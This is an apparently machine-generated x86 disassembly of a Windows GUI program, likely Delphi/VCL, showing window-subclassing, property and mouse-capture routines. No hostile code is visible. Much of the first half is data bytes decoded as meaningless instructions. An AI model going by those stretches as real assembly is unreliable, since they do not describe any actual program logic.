mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc esp
add [ eax + 0x4f ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
dec esp
inc esp
add [ esi + 0x4f ] ah
inc esp
add [ edx + eax ] al
add [ eax ] al
fadd [ esp + eax * 2 ]
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ eax ] al
add [ eax ] al
aam 0x4c
add bh bh
dec [ esp + ecx * 2 ]
inc esp
sub_444db8
mov eax 0xb6ffb7ff
push [ ebp + 0x6cffb4ff ]
aam 0x44
add ah cl
aad 0x44
add ah ch
aad 0x44
add [ eax ] dl
salc
inc esp
add [ eax - 0x2a ] ah
inc esp
add [ eax - 0x5fffbb2a ] al
salc
inc esp
add ah al
salc
inc esp
add al ch
salc
inc esp
add [ edi + edx * 8 ] cl
inc esp
add [ eax ] dh
xlat
inc esp
add [ eax + 0x780044d7 ] bh
fadd [ eax + eax - 0x38 ]
fadd [ eax + eax - 0x4 ]
fadd [ eax + eax + 0x10 ]
fld [ eax + eax - 0x68 ]
loope r-xdata
add [ eax - 0x2a ] dl
inc esp
add ah al
loope r-xdata
add [ eax - 0x7ffbb24 ] cl
fild [ eax + eax + 0x18 ]
fadd [ eax + eax - 0x5c ]
mov ebx 0xdbf40044
inc esp
add ah bh
fadd [ eax + eax - 0x14 ]
std
inc esp
add [ eax - 0x4fffbb08 ] al
fld [ eax + eax + 0x8 ]
loope r-xdata
add [ eax ] dl
fiadd [ eax + eax + 0x24 ]
fiadd [ eax + eax + 0x38 ]
add [ eax - 0x5fffbb1e ] al
loop r-xdata
outsb
inc ebx
outsd
outsb
add al dh
loope r-xdata
fiadd [ eax + eax + 0x4c ]
fiadd [ eax + eax - 0x24 ]
add eax [ ebp ]
xor bh ah
inc esp
add [ edi + 0x44 ] al
add [ eax - 0x19 ] bl
inc esp
add [ eax - 0x19 ] ah
inc esp
add [ eax - 0x19 ] ch
inc esp
add [ eax - 0x19 ] dh
inc esp
add al cl
out 0x44 eax
add [ eax ] dl
call 0xffffffffe87c4ec8
inc esp
add [ eax + ebp * 8 - 0x178bffbc ] dh
inc esp
add ah dh
call 0xffffffffe9784ed8
inc esp
add [ eax + 0x400044e7 ] ah
out 0x44 al
add [ eax + 0x40044e6 ] dl
out 0x44 eax
add [ eax ] dl
out 0x44 eax
add [ ecx + ebp * 8 + 0x44 ] dh
add [ edx + ebp * 8 ] al
inc esp
add [ ecx + ebp * 8 + 0x44 ] bh
add [ ecx + ebp * 8 - 0x1673ffbc ] al
inc esp
add [ ecx + ebp * 8 - 0x154bffbc ] dl
inc esp
add [ eax - 0x13ffbb15 ] bl
jmp r-xdata
add [ eax ] bh
add [ ebx + 0x44 ] al
add [ esp ] dl
inc esp
add [ esp - 0x1b23ffbc ] bh
inc esp
add [ eax ] dl
in eax 0x44
add [ eax ] dh
in eax 0x44
add [ eax + eax - 0x1a9bffbb ] ah
inc esp
add [ eax + 0x340044e5 ] al
add [ ebp ] eax
cld
in eax 0x44
add [ eax ] ah
out 0x44 al
add [ esi + edx * 8 ] ch
inc esp
add [ eax - 0x2a ] al
inc esp
stosd [ edi ]
inc esp
add ah al
outsd
insb
je r-xdata
add al al
loop r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
add [ eax ] dh
jg r-xdata
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
outsd
insb
jae r-xdata
or al 0x4c
inc esp
add [ edi + eax * 2 + 0xb0044 ] bl
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebp - 0x22abffbc ] ah
inc esp
add al cl
clc
inc esp
add [ eax + esi * 8 + 0x44 ] bl
add [ edx + esi * 8 ] bl
inc esp
add [ eax ] bh
fadd [ eax + eax + 0x78 ]
mov esp 0xf2940044
inc esp
add [ esi + esi * 8 + 0x540b0044 ] ah
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
mov eax eax
js r-xdata
insb
xchg esp eax
push eax
inc esp
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
jle r-xdata
add ah al
mov [ eax + eax - 0x4 ] al
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ eax + 0x1c004480 ] dh
nop
inc esp
add [ eax + 0x6 ] ch
inc ebp
add [ ecx ] al
add [ edi ] cl
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
add [ ebx + 0x444fe8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
jg r-xdata
inc esp
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ eax ] cl
lahf
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ 0xffffffffabe80045 ] 0x44
add al ah
lahf
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
inc esp
add [ edi ] al
or edx [ edi + edx * 2 + 0x69 ]
mov esp 0xf400450f
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
call 0xffffffff9c4494f9
inc edi
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
jo r-xdata
add al al
add eax 0x540f0045
inc edi
jb r-xdata
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ esi + ecx + 0x5240042 ] ah
inc ebp
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ eax ] bh
jle r-xdata
inc edx
add [ ebx + ecx + 0x42 ] bh
inc esp
add [ eax + 0x64004450 ] al
add [ eax ] eax
add ah bl
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0xf600042 ] ah
inc ebp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
outsd
insb
jae r-xdata
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax + 0x1004510 ] bh
add [ edi ] cl
add ah ch
cmovne eax [ eax ]
push cs
push esp
inc ebx
jne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebx + 0x445108c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
push ecx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
push ecx
inc esp
add ah bl
push ecx
inc esp
add [ edx + eax ] cl
add [ eax ] al
ror [ ebx + 0x44 ] 0x0
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
push esp
into
inc esp
je r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx + 0x66c0042 ] ah
inc ebp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov esp 0xf400450f
std
inc eax
add [ esi + ecx * 8 + 0x44 ] dl
insd
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax - 0x3fffbaf9 ] ch
or eax [ ebp ]
push esp
or [ ebp ] eax
cmp al 0xb
inc ebp
add [ ebx + ecx + 0x45 ] ah
add [ eax + 0x8 ] dl
inc ebp
add [ eax + eax ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax + 0x73c0317 ]
inc ebp
add [ edi + eax + 0x45 ] al
add [ eax + ecx + 0xc2c0045 ] bh
inc ebp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ edx + esi + 0x40 ] al
add [ edi + ecx - 0x20bffbb ] bh
outsd
insb
nop
add al bl
push es
inc ebp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
inc esp
add [ edi + eax * 8 + 0x44 ] bh
shl [ eax + 0x53 ] 0x44
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
imul ebp [ esi + 0x64 ] 0x5264776f
inc esp
add ah ch
push ecx
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov ecx gs
shufps xmm0 [ eax ] 0x0
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
outsd
insb
jae r-xdata
add [ ebx + 0x4453e0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push ebx
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
sub_445488
push 0x72004454
push esp
inc esp
add [ esp + edx * 2 + 0x44 ] bh
add ch ch
push ebx
inc esp
add ch dh
push ebx
inc esp
add ch bh
push ebx
inc esp
add [ 0x12004454 ] al
push esp
inc esp
add [ edi ] bl
push esp
inc esp
add [ esp + edx * 2 ] ch
inc esp
add [ ecx ] bh
push esp
inc esp
add [ esi + 0x54 ] al
inc esp
add [ ebx + 0x54 ] dl
inc esp
add [ eax + 0x54 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x5488e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ edx * 2 + 0x54c00044 ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x55 ] bl
inc esp
add [ eax ] bh
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
shl [ eax + eax * 2 ] 0x0
hlt
sub_445568
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x55
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax - 0x3fffbff0 ] dh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
xor al 0x40
inc ebp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x4ff7ffbe ] ah
inc esp
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
or eax [ edx ]
movsb [ edi ] [ esi ]
push cs
inc edx
add [ eax ] cl
mov al 0x44
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub al 0xb1
inc esp
add ah dh
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
nop
add al 0x56
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
push esi
inc esp
add [ eax ] cl
add al [ eax ]
add al al
dec ebx
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah cl
sub al [ eax ]
int3
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
sub_44567a
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah cl
sub al [ eax ]
int3
sub_4457fa
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax - 0x3f ] ch
inc esp
add [ esp + eax * 8 + 0x44 ] ah
add [ edx + eax * 8 - 0x37ebffbc ] dl
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah cl
sub al [ eax ]
int3
sub_4458e8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_4459a0
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_4459d4
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4044c8
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_4459a0
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_445a30
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_445c14
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c3f4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404528
mov eax edi
mov edx esi
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445c58
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c3f4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404528
mov eax edi
mov edx esi
call sub_40405c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445cc4
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
jne r-xdata
mov eax ebx
call sub_44f2dc
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_445d70
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_418310
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_445da4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_445dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_445da4
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_445d70
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4181b4
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41838c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_445e28
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4181e8
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418310
mov edx 0x8
call sub_4026ec
inc esi
dec ebx
jne r-xdata
sub_445e5c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_418310
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_445d70
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_445ec0
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_445f20
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031e0
mov edx esp
mov eax esi
call sub_40426c
add esp 0x100
pop esi
pop ebx
retn
sub_445f5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446026
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44707c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_446a04
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b4c
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_446a04
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44707c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_446a04
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44707c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_44602b
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468614
call sub_403ac0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44707c
sub_446084
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4460ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446114
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445ec0
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_446140
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_40348c
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_44616c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_40348c
xor edx edx
sub_4461c4
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_450f00
sub_4461e4
push ebx
mov ebx eax
